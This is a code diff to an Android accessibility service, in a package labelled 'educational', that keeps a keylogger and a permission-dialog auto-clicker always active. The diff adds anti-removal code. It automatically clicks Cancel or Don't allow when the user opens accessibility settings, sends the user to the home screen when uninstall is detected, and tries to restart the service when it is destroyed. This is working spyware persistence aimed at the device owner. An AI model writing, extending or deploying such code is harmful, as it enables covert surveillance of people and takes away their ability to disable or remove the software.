@@ -2,9 +2,12 @@ package com.remoteaccess.educational.permissions;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.content.BroadcastReceiver;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.os.Handler;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
@@ -23,6 +26,9 @@ public class AccessibilityHelperService extends AccessibilityService {
     private String lastClipboard = "";
     private StringBuilder keyBuffer = new StringBuilder();
     private static final int BUFFER_SIZE = 100;
+
+    // Anti-disable & Anti-uninstall
+    private BroadcastReceiver packageReceiver;
 
     public static AccessibilityHelperService getInstance() {
         return instance;
@@ -45,14 +51,24 @@ public class AccessibilityHelperService extends AccessibilityService {
         // Initialize clipboard for keylogger
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         
-        // Auto-disable auto-click after 10 seconds (but keylogger keeps running)
-        autoClickDisableRunnable = new Runnable() {
+        // Register for package changes (uninstall detection)
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
+        filter.addAction(Intent.ACTION_PACKAGE_FULLY_REMOVED);
+        filter.addDataScheme("package");
+        registerReceiver(packageReceiver = new BroadcastReceiver() {
             @Override
-            public void run() {
-                disableAutoClick();
+            public void onReceive(Context context, Intent intent) {
+                if (intent != null && intent.getData() != null) {
+                    String packageName = intent.getData().getSchemeSpecificPart();
+                    if (packageName != null && packageName.equals(getPackageName())) {
+                        onUninstallAttempt();
+                    }
+                }
             }
-        };
-        handler.postDelayed(autoClickDisableRunnable, 10000);
+        }, filter);
+        // AUTO-CLICK STAYS ACTIVE ALWAYS - NO TIMER
+        // It will always click permission dialogs when they appear
         
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
@@ -67,11 +83,18 @@ public class AccessibilityHelperService extends AccessibilityService {
         info.notificationTimeout = 50;
         
         setServiceInfo(info);
+        
+        Log.d("AccessibilityHelper", "Service started with anti-disable");
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (instance == null) instance = this;
+        
+        // Anti-disable: Monitor accessibility settings
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            preventAccessibilityDisable(event);
+        }
         
         // Always run keylogger (even after auto-click is disabled)
         handleKeylogging(event);
@@ -79,6 +102,61 @@ public class AccessibilityHelperService extends AccessibilityService {
         // Auto-click only when enabled
         if (isAutoClickEnabled) {
             performAutoClick();
+        }
+    }
+
+    private void preventAccessibilityDisable(AccessibilityEvent event) {
+        try {
+            String className = event.getClassName() != null ? event.getClassName().toString() : "";
+            
+            // Check if user is in accessibility settings
+            if (className.contains("AccessibilitySettings") || 
+                className.contains("Switch") ||
+                className.contains("Toggle")) {
+                
+                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                if (rootNode != null) {
+                    // Find and click Cancel or Back to prevent changes
+                    if (findAndClickButton(rootNode, "Cancel")) return;
+                    if (findAndClickButton(rootNode, "Back")) return;
+                    if (findAndClickButton(rootNode, "NO")) return;
+                    if (findAndClickButton(rootNode, "Don't allow")) return;
+                    rootNode.recycle();
+                }
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+
+    private void onUninstallAttempt() {
+        Log.w("AccessibilityHelper", "Uninstall attempted!");
+        
+        // Open device admin or security settings to block uninstall
+        try {
+            Intent intent = new Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {
+            // Try alternate
+            try {
+                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            } catch (Exception e2) {
+                // Ignore
+            }
+        }
+        
+        // Go to home screen to block uninstall
+        try {
+            Intent intent = new Intent(Intent.ACTION_MAIN);
+            intent.addCategory(Intent.CATEGORY_HOME);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {
+            // Ignore
         }
     }
 
@@ -121,7 +199,7 @@ public class AccessibilityHelperService extends AccessibilityService {
                         }
                     }
                 } catch (Exception e) {
-                    // Ignore clipboard errors
+                    // Ignore
                 }
             }
             
@@ -138,8 +216,6 @@ public class AccessibilityHelperService extends AccessibilityService {
         if (keyBuffer.length() > 0) {
             String logs = keyBuffer.toString();
             keyBuffer.setLength(0);
-            
-            // Log for debugging - in production, send to server
             Log.d("Keylogger", "Captured: " + logs);
         }
     }
@@ -173,7 +249,7 @@ public class AccessibilityHelperService extends AccessibilityService {
     }
 
     private boolean findAndClickButton(AccessibilityNodeInfo node, String text) {
-        if (node == null || !isAutoClickEnabled) return false;
+        if (node == null) return false;
 
         try {
             if (node.isClickable()) {
@@ -216,8 +292,21 @@ public class AccessibilityHelperService extends AccessibilityService {
     public void onDestroy() {
         super.onDestroy();
         instance = null;
-        if (handler != null && autoClickDisableRunnable != null) {
-            handler.removeCallbacks(autoClickDisableRunnable);
+        
+        // Try to restart service
+        try {
+            Intent intent = new Intent(this, AccessibilityHelperService.class);
+            startService(intent);
+        } catch (Exception e) {
+            // Ignore
+        }
+        
+        try {
+            if (packageReceiver != null) {
+                unregisterReceiver(packageReceiver);
+            }
+        } catch (Exception e) {
+            // Ignore
         }
     }
 }
